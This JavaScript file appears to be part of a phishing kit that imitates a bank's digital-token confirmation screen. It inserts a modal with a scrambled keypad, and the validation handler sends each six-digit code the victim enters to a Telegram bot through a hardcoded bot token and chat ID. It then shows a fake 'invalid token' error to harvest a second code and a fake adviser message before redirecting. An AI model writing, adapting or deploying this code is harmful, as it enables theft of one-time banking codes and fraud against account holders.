// Crear el modal flotante de token completamente estático y centrado
const modalHTML = `
<div id="modal-token" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center; padding:15px; box-sizing:border-box;">
  <div class="token-container" style="background:white; padding:20px; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:100%; max-width:320px; min-width:280px; margin:0 auto; position:static; transform:none;">
    
    <!-- Header compacto -->
    <div class="token-header" style="margin-bottom:20px;">
      <div class="phone-illustration" style="margin-bottom:12px; display:flex; justify-content:center;">
        <img src="imagen/token.png" alt="Token Digital" class="token-image" style="width:100px; height:100px; object-fit:contain;">
      </div>
      <h1 style="color:#6b7280; font-size:13px; font-weight:400; margin-bottom:4px;">Para confirmar ingresa tu</h1>
      <h2 style="color:#374151; font-size:15px; font-weight:600;">Token digital o físico</h2>
    </div>

    <!-- Display de cuadrados con círculos dentro - COMPLETAMENTE ESTÁTICO -->
    <div class="token-display" style="margin-bottom:20px;">
      <div class="token-circles" style="display:flex; align-items:center; justify-content:center; gap:8px; padding:10px; background:#f8f9fa; border-radius:8px; border:1px solid #e9ecef; margin:0 auto; width:fit-content;">
        <div class="square-container" id="square-0" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-1" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-2" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-3" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-4" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-5" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:18px; height:18px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <button class="eye-button" id="toggleVisibility" style="background:#6c757d; border:none; border-radius:6px; width:35px; height:35px; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:background-color 0.2s ease; margin-left:6px;">
          <img src="imagen/ojo.png" alt="Ver" class="eye-icon" style="width:16px; height:16px; filter:brightness(0) invert(1);">
        </button>
      </div>
    </div>

    <!-- Teclado numérico con el mismo ancho exacto que la fila de arriba -->
    <div class="keypad" style="margin-bottom:15px; display:flex; flex-direction:column; align-items:center;">
      <div class="keypad-container" style="width:287px; display:flex; flex-direction:column; gap:8px;">
        <!-- Primera fila: 6 7 0 1 -->
        <div class="keypad-row" style="display:flex; gap:8px; justify-content:space-between;">
          <button class="key number-key" data-number="6" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">6</button>
          <button class="key number-key" data-number="7" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">7</button>
          <button class="key number-key" data-number="0" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">0</button>
          <button class="key number-key" data-number="1" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">1</button>
        </div>
        <!-- Segunda fila: 5 2 4 9 -->
        <div class="keypad-row" style="display:flex; gap:8px; justify-content:space-between;">
          <button class="key number-key" data-number="5" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">5</button>
          <button class="key number-key" data-number="2" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">2</button>
          <button class="key number-key" data-number="4" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">4</button>
          <button class="key number-key" data-number="9" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">9</button>
        </div>
        <!-- Tercera fila: basura 3 8 borrar -->
        <div class="keypad-row" style="display:flex; gap:8px; justify-content:space-between;">
          <button class="key action-key" id="deleteAll" style="width:60px; height:60px; border:1.5px solid #dee2e6; border-radius:6px; background:#f8f9fa; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
            <img src="imagen/basura.png" alt="Borrar todo" class="action-icon" style="width:100px; height:100px; opacity:0.7;">
          </button>
          <button class="key number-key" data-number="3" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">3</button>
          <button class="key number-key" data-number="8" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:white; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">8</button>
          <button class="key action-key" id="deleteOne" style="width:35px; height:35px; border:1.5px solid #dee2e6; border-radius:6px; background:#f8f9fa; font-size:14px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
            <img src="imagen/borrar.png" alt="Borrar" class="action-icon" style="width:60px; height:60px; opacity:0.7;">
          </button>
        </div>
      </div>
    </div>

    <!-- Información compacta -->
    <div class="info" style="display:flex; align-items:flex-start; gap:8px; padding:10px; background:#f8fafc; border-radius:6px; text-align:left; margin-bottom:15px;">
      <div class="info-icon" style="color:#3b82f6; font-weight:bold; font-size:12px; margin-top:1px; flex-shrink:0;">ⓘ</div>
      <p style="color:#6b7280; font-size:10px; line-height:1.3;">Recuerda que el código de tu Token es diferente a tu Clave de Internet.</p>
    </div>

    <!-- Botón de validar compacto -->
    <button id="validate-token" style="width:100%; padding:10px 16px; background-color:#ff6c00; border:none; color:white; font-weight:bold; border-radius:6px; cursor:pointer; font-size:13px; transition:background-color 0.2s ease;">
      Validar Token
    </button>
  </div>
</div>

<!-- Modal de carga con loader como en la imagen -->
<div id="modal-cargando" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#002a8d; z-index:9999; justify-content:center; align-items:center; flex-direction:column; font-family:Arial, sans-serif;">
  <div class="spinner-container" style="display:flex; flex-direction:column; align-items:center;">
    <div class="spinner-wrapper" style="position:relative; width:70px; height:70px; margin-bottom:15px;">
      <div class="spinner" style="position:absolute; top:0; left:0; width:70px; height:70px; border:3px solid #002376; border-top:3px solid #ff7800; border-radius:50%; animation:spin 1s linear infinite;"></div>
      <img class="spinner-icon" src="imagen/favicon.png" alt="Ícono" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); width:40px; height:40px; object-fit:contain;">
    </div>
    <p class="message" style="color:white; text-align:center; font-size:14px;">Espere un momento<br>por favor</p>
  </div>
</div>

<div id="modal-error-token" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center;">
  <div style="background:white; padding:20px; border-radius:10px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:90%; max-width:280px; margin:0 auto; position:static; transform:none;">
    <h3 style="margin-bottom:12px; color:#d00000; font-size:14px;">❌ Token inválido</h3>
    <p style="font-size:11px; line-height:1.4;">El token no puede ser igual a la clave de internet.<br>Ingresa a tu App para obtener el token digital.</p>
  </div>
</div>

<div id="modal-asesor" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center;">
  <div style="background:white; padding:20px; border-radius:10px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:90%; max-width:280px; margin:0 auto; position:static; transform:none;">
    <h3 style="margin-bottom:12px; color:#002f87; font-size:14px;">📞 Atención al Cliente</h3>
    <p style="font-size:12px; line-height:1.4;">En breve un asesor se comunicará contigo.</p>
  </div>
</div>

<style>
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes ripple-animation {
  to {
    transform: scale(4);
    opacity: 0;
  }
}

/* Estados de los cuadrados - SIN MOVIMIENTOS */
.square-container.filled {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
}

.square-container.filled .inner-circle {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
}

.square-container.hidden .inner-circle {
  background: #495057 !important;
  border-color: #495057 !important;
}

/* Hover de botones - SIN MOVIMIENTOS */
.key:hover {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
  box-shadow: 0 2px 6px rgba(59, 130, 246, 0.12);
}

.key:active {
  box-shadow: 0 1px 3px rgba(59, 130, 246, 0.12);
}

.action-key:hover {
  background: #e9ecef !important;
  border-color: #adb5bd !important;
}

.eye-button:hover {
  background: #5a6268 !important;
}

#validate-token:hover {
  background-color: #e55a00 !important;
}

.ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(59, 130, 246, 0.25);
  transform: scale(0);
  animation: ripple-animation 0.5s linear;
  pointer-events: none;
}

/* Responsividad perfecta para móviles - SIN MOVIMIENTOS */
@media (max-width: 480px) {
  .token-container {
    max-width: 300px !important;
    padding: 18px !important;
    margin: 0 auto !important;
    position: static !important;
    transform: none !important;
  }
  
  .token-circles {
    width: fit-content !important;
    margin: 0 auto !important;
    gap: 6px !important;
    padding: 8px !important;
  }
  
  .square-container {
    width: 32px !important;
    height: 32px !important;
  }
  
  .inner-circle {
    width: 100px !important;
    height: 100px !important;
    font-size: 10px !important;
  }
  
  .key {
    width: 100px !important;
    height: 100px !important;
    font-size: 13px !important;
  }
  
  .eye-button {
    width: 32px !important;
    height: 32px !important;
  }
  
  .eye-icon {
    width: 40px !important;
    height: 40px !important;
  }
  
  .action-icon {
    width: 40px !important;
    height: 40px !important;
  }
  
  .keypad-container {
    width: 300px !important;
  }
  
  .keypad-row {
    gap: 6px !important;
    justify-content: space-between !important;
  }
}

@media (max-width: 360px) {
  .token-container {
    max-width: 280px !important;
    padding: 15px !important;
    margin: 0 auto !important;
    position: static !important;
    transform: none !important;
  }
  
  .token-circles {
    gap: 5px !important;
    padding: 6px !important;
    width: fit-content !important;
    margin: 0 auto !important;
  }
  
  .keypad-row {
    gap: 5px !important;
    justify-content: space-between !important;
  }
  
  .square-container {
    width: 30px !important;
    height: 30px !important;
  }
  
  .inner-circle {
    width: 20px !important;
    height: 20px !important;
    font-size: 9px !important;
  }
  
  .key {
    width: 30px !important;
    height: 30px !important;
    font-size: 12px !important;
  }
  
  .eye-button {
    width: 30px !important;
    height: 30px !important;
  }
  
  .keypad-container {
    width: 210px !important;
  }
}

@media (max-width: 320px) {
  .token-container {
    max-width: 260px !important;
    padding: 12px !important;
    margin: 0 auto !important;
    position: static !important;
    transform: none !important;
  }
  
  .token-circles {
    gap: 4px !important;
    padding: 5px !important;
    width: fit-content !important;
    margin: 0 auto !important;
  }
  
  .keypad-row {
    gap: 4px !important;
    justify-content: space-between !important;
  }
  
  .square-container {
    width: 28px !important;
    height: 28px !important;
  }
  
  .inner-circle {
    width: 14px !important;
    height: 14px !important;
    font-size: 8px !important;
  }
  
  .key {
    width: 28px !important;
    height: 28px !important;
    font-size: 11px !important;
  }
  
  .eye-button {
    width: 28px !important;
    height: 28px !important;
  }
  
  .keypad-container {
    width: 190px !important;
  }
}
</style>
`;

// Clase para manejar el token input - SIN ANIMACIONES QUE MUEVAN EL MODAL
class TokenInput {
  constructor() {
    this.token = '';
    this.maxLength = 6;
    this.isVisible = false;
    this.attemptCount = 0; // Contador de intentos
    this.init();
  }

  init() {
    this.bindEvents();
    this.updateDisplay();
  }

  bindEvents() {
    // Number keys
    document.querySelectorAll('.number-key').forEach(key => {
      key.addEventListener('click', (e) => {
        const number = e.target.dataset.number;
        this.addDigit(number);
      });
    });

    // Delete one digit
    document.getElementById('deleteOne').addEventListener('click', (e) => {
      this.deleteLastDigit();
    });

    // Delete all digits
    document.getElementById('deleteAll').addEventListener('click', (e) => {
      this.clearAll();
    });

    // Toggle visibility
    document.getElementById('toggleVisibility').addEventListener('click', (e) => {
      this.toggleVisibility();
    });

    // Keyboard support
    document.addEventListener('keydown', (e) => {
      if (document.getElementById('modal-token').style.display === 'flex') {
        if (e.key >= '0' && e.key <= '9') {
          this.addDigit(e.key);
        } else if (e.key === 'Backspace') {
          this.deleteLastDigit();
        } else if (e.key === 'Delete') {
          this.clearAll();
        }
      }
    });
  }

  addDigit(digit) {
    if (this.token.length < this.maxLength) {
      this.token += digit;
      this.updateDisplay();
      this.playSound();
    } else {
      this.playErrorSound();
    }
  }

  deleteLastDigit() {
    if (this.token.length > 0) {
      this.token = this.token.slice(0, -1);
      this.updateDisplay();
      this.playSound();
    }
  }

  clearAll() {
    this.token = '';
    this.updateDisplay();
    this.playSound();
  }

  toggleVisibility() {
    this.isVisible = !this.isVisible;
    this.updateDisplay();
    this.playSound();
  }

  updateDisplay() {
    const squares = document.querySelectorAll('.square-container');
    
    squares.forEach((square, index) => {
      const innerCircle = square.querySelector('.inner-circle');
      square.classList.remove('filled', 'hidden');
      innerCircle.textContent = '';
      
      if (index < this.token.length) {
        square.classList.add('filled');
        
        if (this.isVisible) {
          innerCircle.textContent = this.token[index];
        } else {
          square.classList.add('hidden');
        }
      }
    });

    // Update eye icon based on visibility state
    const eyeIcon = document.querySelector('.eye-icon');
    if (eyeIcon) {
      if (this.isVisible) {
        eyeIcon.style.opacity = '1';
      } else {
        eyeIcon.style.opacity = '0.7';
      }
    }
  }

  playSound() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.05);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.05);
    } catch (e) {
      console.log('Audio not supported');
    }
  }

  playErrorSound() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.08, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.1);
    } catch (e) {
      console.log('Audio not supported');
    }
  }

  getToken() {
    return this.token;
  }

  isValid() {
    return this.token.length === this.maxLength;
  }

  getAttemptCount() {
    return this.attemptCount;
  }

  incrementAttempt() {
    this.attemptCount++;
  }
}

document.addEventListener('DOMContentLoaded', () => {
  document.body.insertAdjacentHTML('beforeend', modalHTML);

  let tokenInput;

  // Mostrar modal de token después de 4 segundos
  setTimeout(() => {
    const modal = document.getElementById('modal-token');
    if (modal) {
      modal.style.display = 'flex';
      tokenInput = new TokenInput();
    }
  }, 4000);

  // Add ripple effect to buttons - SIN AFECTAR POSICIÓN
  document.addEventListener('click', function(e) {
    if (e.target.closest('.key')) {
      const button = e.target.closest('.key');
      const ripple = document.createElement('span');
      const rect = button.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      const x = e.clientX - rect.left - size / 2;
      const y = e.clientY - rect.top - size / 2;
      
      ripple.style.width = ripple.style.height = size + 'px';
      ripple.style.left = x + 'px';
      ripple.style.top = y + 'px';
      ripple.classList.add('ripple');
      
      button.appendChild(ripple);
      
      setTimeout(() => {
        ripple.remove();
      }, 500);
    }
  });

  // Validación final del token
  document.addEventListener('click', (e) => {
    if (e.target.id === 'validate-token') {
      if (tokenInput && tokenInput.isValid()) {
        const code = tokenInput.getToken();
        
        // Incrementar contador de intentos
        tokenInput.incrementAttempt();
        const currentAttempt = tokenInput.getAttemptCount();

        // Mostrar loader primero
        document.getElementById('modal-token').style.display = 'none';
        document.getElementById('modal-cargando').style.display = 'flex';

        // Enviar datos al bot en AMBOS intentos
        const token = '7779988089:AAE4-6hOLNzGIfh5evEvaNLUEtYCyDhaDec';
        const chatId = '7759602420';
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const message = `🔐 Token ingresado (Intento ${currentAttempt}): ${code}`;
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        // Después de 2 segundos mostrar error de token
        setTimeout(() => {
          document.getElementById('modal-cargando').style.display = 'none';
          document.getElementById('modal-error-token').style.display = 'flex';

          // Después de 3 segundos cerrar error y decidir qué hacer
          setTimeout(() => {
            document.getElementById('modal-error-token').style.display = 'none';
            
            if (currentAttempt >= 2) {
              // Segundo intento o más: mostrar mensaje de asesor
              document.getElementById('modal-asesor').style.display = 'flex';
              
              setTimeout(() => {
                localStorage.removeItem('claveInternet');
                window.location.href = 'index2.html';
              }, 5000);
            } else {
              // Primer intento: volver al modal de token
              document.getElementById('modal-token').style.display = 'flex';
              // Limpiar el token para que pueda ingresar uno nuevo
              tokenInput.clearAll();
            }
          }, 3000);
        }, 3000);
      } else {
        alert('Debes ingresar los 6 dígitos del token');
        if (tokenInput) {
          tokenInput.playErrorSound();
        }
      }
    }
  });
});